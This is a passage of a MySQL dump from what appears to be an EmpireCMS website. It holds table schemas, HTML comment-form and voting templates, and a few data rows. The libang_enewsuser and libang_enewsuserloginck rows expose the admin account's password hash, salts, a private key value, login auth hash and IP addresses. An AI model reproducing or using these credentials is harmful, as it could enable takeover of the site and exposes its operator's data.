width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"2\\\">\r\n<tr>\r\n<td width=\\\"56%\\\" align=\\\"left\\\">用户名:\r\n<input name=\\\"username\\\" type=\\\"text\\\" class=\\\"inputText\\\" id=\\\"username\\\" value=\\\"\\\" size=\\\"16\\\" /></td>\r\n<td width=\\\"44%\\\" align=\\\"left\\\">密码:\r\n<input name=\\\"password\\\" type=\\\"password\\\" class=\\\"inputText\\\" id=\\\"password\\\" value=\\\"\\\" size=\\\"16\\\" /></td>\r\n</tr>\r\n<tr>\r\n<td align=\\\"left\\\">验证码:\r\n<input name=\\\"key\\\" type=\\\"text\\\" class=\\\"inputText\\\" size=\\\"10\\\" />\r\n<img src=\\\"[!--news.url--]e/ShowKey/?v=pl\\\" align=\\\"absmiddle\\\" name=\\\"plKeyImg\\\" id=\\\"plKeyImg\\\" onclick=\\\"plKeyImg.src=\\\'[!--news.url--]e/ShowKey/?v=pl&t=\\\'+Math.random()\\\" title=\\\"看不清楚,点击刷新\\\" /> </td>\r\n<td align=\\\"left\\\"><input name=\\\"nomember\\\" type=\\\"checkbox\\\" id=\\\"nomember\\\" value=\\\"1\\\" checked=\\\"checked\\\" />\r\n匿名发表</td>\r\n</tr>\r\n</table>\r\n<textarea name=\\\"saytext\\\" rows=\\\"6\\\" id=\\\"saytext\\\"></textarea><input name=\\\"imageField\\\" type=\\\"image\\\" src=\\\"[!--news.url--]e/data/images/postpl.gif\\\"/>\r\n<input name=\\\"id\\\" type=\\\"hidden\\\" id=\\\"id\\\" value=\\\"[!--id--]\\\" />\r\n<input name=\\\"classid\\\" type=\\\"hidden\\\" id=\\\"classid\\\" value=\\\"[!--classid--]\\\" />\r\n<input name=\\\"enews\\\" type=\\\"hidden\\\" id=\\\"enews\\\" value=\\\"AddPl\\\" />\r\n<input name=\\\"repid\\\" type=\\\"hidden\\\" id=\\\"repid\\\" value=\\\"0\\\" />\r\n<input type=\\\"hidden\\\" name=\\\"ecmsfrom\\\" value=\\\"[!--titleurl--]\\\"></td>\r\n</tr>\r\n</table>\r\n</td>\r\n</tr>\r\n</table></form>',0,0,0);
/*!40000 ALTER TABLE `libang_enewstempvar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstempvarclass`
--

DROP TABLE IF EXISTS `libang_enewstempvarclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstempvarclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstempvarclass`
--

LOCK TABLES `libang_enewstempvarclass` WRITE;
/*!40000 ALTER TABLE `libang_enewstempvarclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstempvarclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstogzts`
--

DROP TABLE IF EXISTS `libang_enewstogzts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstogzts` (
  `togid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `keyboard` varchar(255) NOT NULL DEFAULT '',
  `searchf` varchar(255) NOT NULL DEFAULT '',
  `query` text NOT NULL,
  `specialsearch` varchar(255) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `retype` tinyint(1) NOT NULL DEFAULT '0',
  `startday` varchar(20) NOT NULL DEFAULT '',
  `endday` varchar(20) NOT NULL DEFAULT '',
  `startid` int(10) unsigned NOT NULL DEFAULT '0',
  `endid` int(10) unsigned NOT NULL DEFAULT '0',
  `pline` int(11) NOT NULL DEFAULT '0',
  `doecmszt` tinyint(1) NOT NULL DEFAULT '0',
  `togztname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`togid`),
  KEY `togztname` (`togztname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstogzts`
--

LOCK TABLES `libang_enewstogzts` WRITE;
/*!40000 ALTER TABLE `libang_enewstogzts` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstogzts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuser`
--

DROP TABLE IF EXISTS `libang_enewsuser`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuser` (
  `userid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `rnd` varchar(20) NOT NULL DEFAULT '',
  `adminclass` mediumtext NOT NULL,
  `groupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `styleid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `filelevel` tinyint(1) NOT NULL DEFAULT '0',
  `salt` varchar(8) NOT NULL DEFAULT '',
  `loginnum` int(10) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastip` varchar(20) NOT NULL DEFAULT '',
  `truename` varchar(20) NOT NULL DEFAULT '',
  `email` varchar(120) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pretime` int(10) unsigned NOT NULL DEFAULT '0',
  `preip` varchar(20) NOT NULL DEFAULT '',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `addip` varchar(20) NOT NULL DEFAULT '',
  `userprikey` varchar(50) NOT NULL DEFAULT '',
  `salt2` varchar(20) NOT NULL DEFAULT '',
  `lastipport` varchar(6) NOT NULL DEFAULT '',
  `preipport` varchar(6) NOT NULL DEFAULT '',
  `addipport` varchar(6) NOT NULL DEFAULT '',
  `uprnd` varchar(32) NOT NULL DEFAULT '',
  `wname` varchar(60) NOT NULL DEFAULT '',
  `tel` varchar(20) NOT NULL DEFAULT '',
  `wxno` varchar(80) NOT NULL DEFAULT '',
  `qq` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`userid`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuser`
--

LOCK TABLES `libang_enewsuser` WRITE;
/*!40000 ALTER TABLE `libang_enewsuser` DISABLE KEYS */;
INSERT INTO `libang_enewsuser` VALUES (1,'admin','69dad1910e73a6a1d410cafc9aa180df','5myYLbjZDvihc6Khiv2e','',1,0,1,0,'I1iFZdvZ',63,1649907086,'171.214.217.147','','',0,1649907053,'220.166.228.81',1586930871,'127.0.0.1','i018ijzFjsdZ5a1APG5JCTadcgA5Bxq2WFPNu5Lw22RhugwJ','kDdLk6NyUL6mqTcRMVoW','25225','23498','51975','','','','','');
/*!40000 ALTER TABLE `libang_enewsuser` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuseradd`
--

DROP TABLE IF EXISTS `libang_enewsuseradd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuseradd` (
  `userid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `equestion` tinyint(4) NOT NULL DEFAULT '0',
  `eanswer` varchar(32) NOT NULL DEFAULT '',
  `openip` text NOT NULL,
  `certkey` varchar(60) NOT NULL DEFAULT '',
  `certtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuseradd`
--

LOCK TABLES `libang_enewsuseradd` WRITE;
/*!40000 ALTER TABLE `libang_enewsuseradd` DISABLE KEYS */;
INSERT INTO `libang_enewsuseradd` VALUES (1,0,'','','',0);
/*!40000 ALTER TABLE `libang_enewsuseradd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserclass`
--

DROP TABLE IF EXISTS `libang_enewsuserclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserclass`
--

LOCK TABLES `libang_enewsuserclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsuserclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserjs`
--

DROP TABLE IF EXISTS `libang_enewsuserjs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserjs` (
  `jsid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `jsname` varchar(60) NOT NULL DEFAULT '',
  `jssql` text NOT NULL,
  `jstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `jsfilename` varchar(120) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`jsid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserjs`
--

LOCK TABLES `libang_enewsuserjs` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserjs` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsuserjs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserjsclass`
--

DROP TABLE IF EXISTS `libang_enewsuserjsclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserjsclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserjsclass`
--

LOCK TABLES `libang_enewsuserjsclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserjsclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsuserjsclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserlist`
--

DROP TABLE IF EXISTS `libang_enewsuserlist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserlist` (
  `listid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `listname` varchar(60) NOT NULL DEFAULT '',
  `pagetitle` varchar(120) NOT NULL DEFAULT '',
  `filepath` varchar(120) NOT NULL DEFAULT '',
  `filetype` varchar(12) NOT NULL DEFAULT '',
  `totalsql` text NOT NULL,
  `listsql` text NOT NULL,
  `maxnum` int(11) NOT NULL DEFAULT '0',
  `lencord` int(11) NOT NULL DEFAULT '0',
  `listtempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pagekeywords` varchar(255) NOT NULL DEFAULT '',
  `pagedescription` varchar(255) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`listid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserlist`
--

LOCK TABLES `libang_enewsuserlist` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserlist` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsuserlist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserlistclass`
--

DROP TABLE IF EXISTS `libang_enewsuserlistclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserlistclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserlistclass`
--

LOCK TABLES `libang_enewsuserlistclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserlistclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsuserlistclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsuserloginck`
--

DROP TABLE IF EXISTS `libang_enewsuserloginck`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsuserloginck` (
  `userid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `andauth` varchar(32) NOT NULL DEFAULT '',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsuserloginck`
--

LOCK TABLES `libang_enewsuserloginck` WRITE;
/*!40000 ALTER TABLE `libang_enewsuserloginck` DISABLE KEYS */;
INSERT INTO `libang_enewsuserloginck` VALUES (1,'3cf8fff9f9dd75bfed592d0e40511b66');
/*!40000 ALTER TABLE `libang_enewsuserloginck` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsvg`
--

DROP TABLE IF EXISTS `libang_enewsvg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsvg` (
  `vgid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `gname` char(60) NOT NULL DEFAULT '',
  `gids` char(255) NOT NULL DEFAULT '',
  `ingids` char(255) NOT NULL DEFAULT '',
  `agids` char(255) NOT NULL DEFAULT '',
  `mlist` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`vgid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsvg`
--

LOCK TABLES `libang_enewsvg` WRITE;
/*!40000 ALTER TABLE `libang_enewsvg` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsvg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsvglist`
--

DROP TABLE IF EXISTS `libang_enewsvglist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsvglist` (
  `vgid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `outtime` int(10) unsigned NOT NULL DEFAULT '0',
  KEY `vgid` (`vgid`),
  KEY `userid` (`userid`),
  KEY `addtime` (`addtime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsvglist`
--

LOCK TABLES `libang_enewsvglist` WRITE;
/*!40000 ALTER TABLE `libang_enewsvglist` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsvglist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsvote`
--

DROP TABLE IF EXISTS `libang_enewsvote`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsvote` (
  `voteid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(120) NOT NULL DEFAULT '',
  `votenum` int(10) unsigned NOT NULL DEFAULT '0',
  `voteip` mediumtext NOT NULL,
  `votetext` text NOT NULL,
  `voteclass` tinyint(1) NOT NULL DEFAULT '0',
  `doip` tinyint(1) NOT NULL DEFAULT '0',
  `votetime` int(10) unsigned NOT NULL DEFAULT '0',
  `dotime` date NOT NULL DEFAULT '0000-00-00',
  `width` int(11) NOT NULL DEFAULT '0',
  `height` int(11) NOT NULL DEFAULT '0',
  `addtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`voteid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsvote`
--

LOCK TABLES `libang_enewsvote` WRITE;
/*!40000 ALTER TABLE `libang_enewsvote` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsvote` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsvotemod`
--

DROP TABLE IF EXISTS `libang_enewsvotemod`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsvotemod` (
  `voteid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(120) NOT NULL DEFAULT '',
  `votetext` text NOT NULL,
  `voteclass` tinyint(1) NOT NULL DEFAULT '0',
  `doip` tinyint(1) NOT NULL DEFAULT '0',
  `dotime` date NOT NULL DEFAULT '0000-00-00',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `width` int(11) NOT NULL DEFAULT '0',
  `height` int(11) NOT NULL DEFAULT '0',
  `votenum` int(10) unsigned NOT NULL DEFAULT '0',
  `ysvotename` varchar(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`voteid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsvotemod`
--

LOCK TABLES `libang_enewsvotemod` WRITE;
/*!40000 ALTER TABLE `libang_enewsvotemod` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsvotemod` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsvotetemp`
--

DROP TABLE IF EXISTS `libang_enewsvotetemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsvotetemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsvotetemp`
--

LOCK TABLES `libang_enewsvotetemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsvotetemp` DISABLE KEYS */;
INSERT INTO `libang_enewsvotetemp` VALUES (1,'默认投票模板','<table width=100% border=0 align=center cellpadding=3 cellspacing=0><form name=enewsvote method=POST action=\'[!--vote.action--]\' target=_blank><tr><td><strong>[!--title--]</strong></td></tr><input type=hidden name=voteid value=\'[!--voteid--]\'><input type=hidden name=enews value=AddVote>\r\n[!--empirenews.listtemp--]\r\n<tr><td>[!--vote.box--]&nbsp;[!--vote.name--]</td></tr>\r\n[!--empirenews.listtemp--]\r\n<tr><td align=center><input type=submit name=submit value=投票>&nbsp;&nbsp;<input type=button name=button value=查看结果 onclick=javascript:window.open(\'[!--vote.view--]\',\'\',\'width=[!--width--],height=[!--height--],scrollbars=yes\');></td></tr></form></table>'),(2,'默认信息投票模板','<table width=\\\'100%\\\' border=0 align=center cellpadding=3 cellspacing=0><form name=enewsvote method=POST action=\\\'[!--news.url--]e/enews/index.php\\\' target=_blank><tr><td><strong>[!--title--]</strong></td></tr><input type=hidden name=id value=\\\'[!--id--]\\\'><input type=hidden name=classid value=\\\'[!--classid--]\\\'><input type=hidden name=enews value=AddInfoVote>\r\n[!--empirenews.listtemp--]\r\n<tr><td>[!--vote.box--]&nbsp;[!--vote.name--]</td></tr>\r\n[!--empirenews.listtemp--]\r\n<tr><td align=center><input type=submit name=submit value=投票>&nbsp;&nbsp;<input type=button name=button value=查看结果 onclick=javascript:window.open(\\\'[!--news.url--]e/public/vote/?classid=[!--classid--]&id=[!--id--]\\\',\\\'\\\',\\\'width=[!--width--],height=[!--height--],scrollbars=yes\\\');></td></tr></form></table>');
/*!40000 ALTER TABLE `libang_enewsvotetemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewswapstyle`
--

DROP TABLE IF EXISTS `libang_enewswapstyle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewswapstyle` (
  `styleid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `stylename` varchar(60) NOT NULL DEFAULT '',
  `path` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`styleid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewswapstyle`
--

LOCK TABLES `libang_enewswapstyle` WRITE;
/*!40000 ALTER TABLE `libang_enewswapstyle` DISABLE KEYS */;
INSERT INTO `libang_enewswapstyle` VALUES (1,'新闻模板',1),(2,'分类信息模板',2);
/*!40000 ALTER TABLE `libang_enewswapstyle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewswfinfo`
--

DROP TABLE IF EXISTS `libang_enewswfinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewswfinfo` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `wfid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `groupid` text NOT NULL,
  `userclass` text NOT NULL,
  `username` text NOT NULL,
  `checknum` tinyint(4) NOT NULL DEFAULT '0',
  `tstatus` varchar(30) NOT NULL DEFAULT '0',
  `checktno` tinyint(4) NOT NULL DEFAULT '0',
  KEY `id` (`id`,`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewswfinfo`
--

LOCK TABLES `libang_enewswfinfo` WRITE;
/*!40000 ALTER TABLE `libang_enewswfinfo` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewswfinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewswfinfolog`
--

DROP TABLE IF EXISTS `libang_enewswfinfolog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewswfinfolog` (
  `logid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `wfid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `checktime` int(10) unsigned NOT NULL DEFAULT '0',
  `checktext` text NOT NULL,
  `checknum` tinyint(4) NOT NULL DEFAULT '0',
  `checktype` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`logid`),
  KEY `id` (`id`,`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewswfinfolog`
--

LOCK TABLES `libang_enewswfinfolog` WRITE;
/*!40000 ALTER TABLE `libang_enewswfinfolog` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewswfinfolog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewswords`
--

DROP TABLE IF EXISTS `libang_enewswords`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewswords` (
  `wordid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `oldword` varchar(255) NOT NULL DEFAULT '',
  `newword` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`wordid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewswords`
--

LOCK TABLES `libang_enewswords` WRITE;
/*!40000 ALTER TABLE `libang_enewswords` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewswords` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsworkflow`
--

DROP TABLE IF EXISTS `libang_enewsworkflow`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsworkflow` (
  `wfid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `wfname` varchar(60) NOT NULL DEFAULT '',
  `wftext` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `adduser` varchar(30) NOT NULL DEFAULT '',
  `canedit` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`wfid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsworkflow`
--

LOCK TABLES `libang_enewsworkflow` WRITE;
/*!40000 ALTER TABLE `libang_enewsworkflow` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsworkflow` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsworkflowitem`
--

DROP TABLE IF EXISTS `libang_enewsworkflowitem`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsworkflowitem` (
  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `wfid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tname` varchar(60) NOT NULL DEFAULT '',
  `tno` int(11) NOT NULL DEFAULT '0',
  `ttext` varchar(255) NOT NULL DEFAULT '',
  `groupid` text NOT NULL,
  `userclass` text NOT NULL,
  `username` text NOT NULL,
  `lztype` tinyint(1) NOT NULL DEFAULT '0',
  `tbdo` int(10) unsigned NOT NULL DEFAULT '0',
  `tddo` int(10) unsigned NOT NULL DEFAULT '0',
  `tstatus` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`),
  KEY `wfid` (`wfid`),
  KEY `tno` (`tno`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsworkflowitem`
--

LOCK TABLES `libang_enewsworkflowitem` WRITE;
/*!40000 ALTER TABLE `libang_enewsworkflowitem` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsworkflowitem` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewswriter`
--

DROP TABLE IF EXISTS `libang_enewswriter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewswriter` (
  `wid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `writer` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(120) NOT NULL DEFAULT '',
  PRIMARY KEY (`wid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewswriter`
--

LOCK TABLES `libang_enewswriter` WRITE;
/*!40000 ALTER TABLE `libang_enewswriter` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewswriter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsyh`
--

DROP TABLE IF EXISTS `libang_enewsyh`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsyh` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `yhname` varchar(30) NOT NULL DEFAULT '',
  `yhtext` varchar(255) NOT NULL DEFAULT '',
  `hlist` int(11) NOT NULL DEFAULT '0',
  `qlist` int(11) NOT NULL DEFAULT '0',
  `bqnew` int(11) NOT NULL DEFAULT '0',
  `bqhot` int(11) NOT NULL DEFAULT '0',
  `bqpl` int(11) NOT NULL DEFAULT '0',
  `bqgood` int(11) NOT NULL DEFAULT '0',
  `bqfirst` int(11) NOT NULL DEFAULT '0',
  `bqdown` int(11) NOT NULL DEFAULT '0',
  `otherlink` int(11) NOT NULL DEFAULT '0',
  `qmlist` int(11) NOT NULL DEFAULT '0',
  `dobq` tinyint(1) NOT NULL DEFAULT '0',
  `dojs` tinyint(1) NOT NULL DEFAULT '0',
  `dosbq` tinyint(1) NOT NULL DEFAULT '0',
  `rehtml` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
